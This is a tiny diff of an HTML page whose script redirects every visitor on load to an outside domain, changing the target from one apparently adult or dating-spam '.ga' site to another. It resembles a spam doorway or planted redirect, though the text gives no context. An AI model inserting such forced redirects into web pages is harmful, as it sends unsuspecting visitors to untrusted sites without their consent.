@@ -2,7 +2,7 @@
 <html>
 <head>
   <script language="javascript">
-    window.location.href = "http://www.xcamz.ga"
+    window.location.href = "http://www.xdates.ga"
 </script>
 </head>
 <body>
